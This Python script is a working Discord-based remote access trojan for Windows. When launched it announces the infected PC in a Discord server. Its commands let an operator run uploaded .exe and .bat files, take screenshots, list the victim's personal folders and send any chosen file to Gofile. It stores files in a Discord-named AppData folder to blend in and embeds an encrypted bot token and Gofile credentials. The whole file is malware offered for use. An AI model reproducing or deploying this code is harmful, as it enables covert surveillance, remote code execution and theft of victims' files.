import os
import discord
import subprocess
from discord.ext import commands
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet
import requests
import cv2
import numpy as np
from datetime import datetime, timedelta
import asyncio
import pygetwindow as gw
import pyautogui
import time
import aiofiles
import aiohttp
import shutil

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)

encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token

# Decrypt the token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()
print(f"Decrypted token: {TOKEN}")  # Debug statement

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"
FILES_DIR = os.path.join(DOWNLOAD_DIR, "files")
print(f"Download directory: {DOWNLOAD_DIR}")  # Debug statement

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)
    print(f"Created download directory: {DOWNLOAD_DIR}")  # Debug statement

# Ensure the files directory exists
if not os.path.exists(FILES_DIR):
    os.makedirs(FILES_DIR)
    print(f"Created files directory: {FILES_DIR}")  # Debug statement

# Gofile API endpoint and your credentials
GOFILE_API_URL = "https://upload.gofile.io/uploadfile"
GOFILE_ACCOUNT_TOKEN = "GpM5Bh6RYXbYcs2Uvwn4a7dIdCB20UM5"  # Your Gofile account token
GOFILE_ACCOUNT_ID = "de7d5f38-3ce6-4763-b07d-2f17bc86703f"  # Your Gofile account ID

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
        print(f"Created channel: {channel.name}")  # Debug statement
    else:
        print(f"Channel already exists: {channel.name}")  # Debug statement
    return channel

# Function to upload a file to Gofile and get the download link
async def upload_to_gofile(file_path):
    print(f"Uploading file to Gofile: {file_path}")  # Debug statement
    if not os.path.exists(file_path):
        print(f"File does not exist: {file_path}")  # Debug statement
        return None

    async with aiofiles.open(file_path, 'rb') as file:
        data = await file.read()
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'  # Example boundary
        headers = {
            'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
            'X-Request-Id': GOFILE_ACCOUNT_ID,
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }
        body = f'--{boundary}\r\n'.encode() + \
               f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'.encode() + \
               'Content-Type: application/octet-stream\r\n\r\n'.encode() + \
               data + \
               f'\r\n--{boundary}--\r\n'.encode()

        timeout = aiohttp.ClientTimeout(total=60)  # Increase timeout to 60 seconds
        async with aiohttp.ClientSession(timeout=timeout) as session:
            try:
                async with session.post(GOFILE_API_URL, data=body, headers=headers) as response:
                    response_data = await response.text()
                    print(f"API Response: {response_data}")  # Debug statement
                    if response.status == 200:
                        data = await response.json()
                        download_link = data.get('data', {}).get('downloadPage', '')
                        print(f"Upload successful. Download link: {download_link}")  # Debug statement
                        return download_link
                    else:
                        print(f"Upload failed. Status code: {response.status}")  # Debug statement
                        return None
            except aiohttp.ClientError as e:
                print(f"Client error: {e}")
                return None
            except asyncio.TimeoutError:
                print("The request timed out")
                return None

# Custom converter for handling directory paths with spaces
class PathConverter(commands.Converter):
    async def convert(self, ctx, argument):
        return argument

# Command to handle file sending
@bot.command()
async def send(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(FILES_DIR, attachment.filename)
        print(f"Downloading file: {file_path}")  # Debug statement

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
                print(f"Executed file: {file_path}")  # Debug statement
            else:
                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
    embed.set_image(url="attachment://screenshot.png")
    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))

# Command to list specific directories and their contents
@bot.command()
async def filelist(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Define the directories to list
    directories = ["Downloads", "Documents", "Videos", "Pictures"]

    # List all files and directories in the specified directories recursively
    file_list = []
    for dir_name in directories:
        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
        if os.path.exists(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for name in dirs:
                    file_list.append(os.path.join(root, name))
                for name in files:
                    file_list.append(os.path.join(root, name))

    # Split the file list into chunks of 3 embeds
    chunk_size = 3
    for i in range(0, len(file_list), chunk_size):
        chunk = file_list[i:i + chunk_size]
        file_list_str = "\n".join(chunk)
        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to download a specific directory or file
@bot.command()
async def download(ctx, *, path: PathConverter):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Prepend the current user's home directory if the path does not start with a drive letter
    if not os.path.isabs(path):
        path = os.path.join(os.path.expanduser("~"), path)

    print(f"Checking path: {path}")  # Debug statement

    # Check if the path exists
    if os.path.exists(path):
        print(f"File exists: {path}")  # Debug statement
        if os.path.isdir(path):
            # List all files in the specified directory
            files = os.listdir(path)
            file_list = "\n".join([os.path.join(path, file) for file in files])
            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
        elif os.path.isfile(path):
            file_size = os.path.getsize(path)
            print(f"File size: {file_size} bytes")  # Debug statement
            file_extension = os.path.splitext(path)[1].lower()
            print(f"File extension: {file_extension}")  # Debug statement

            # Ensure the file is saved with its original name and extension
            base_name = os.path.basename(path)
            new_file_path = os.path.join(FILES_DIR, base_name)

            # Check if the file already exists in the files directory
            if not os.path.exists(new_file_path):
                # Upload the file to Gofile and get the download link
                download_link = await upload_to_gofile(path)
                if download_link:
                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
            else:
                print(f"File already exists: {new_file_path}")  # Debug statement
                embed = discord.Embed(title="File Already Exists", description=f"The file {base_name} already exists in the files directory.", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        print(f"File does not exist: {path}")  # Debug statement
        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to list all available commands
@bot.command()
async def cmds(ctx):
    # Remove the help command from the list and prepend the prefix
    commands_list = [f"!{command.name}" for command in bot.commands if command.name != "help"]
    embed = discord.Embed(title="Available Commands", description="Here is a list of all available commands:", color=discord.Color.dark_red())
    embed.add_field(name="Commands", value="\n".join(commands_list), inline=False)
    await ctx.send(embed=embed)

# Override the default help command
bot.help_command = None

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    # Create or get the channel
    channel = await get_or_create_channel(guild, channel_name)

    global CHANNEL_ID
    CHANNEL_ID = channel.id
    print(f"Channel ID set to: {CHANNEL_ID}")  # Debug statement

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.dark_red())
    await channel.send(embed=embed)

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
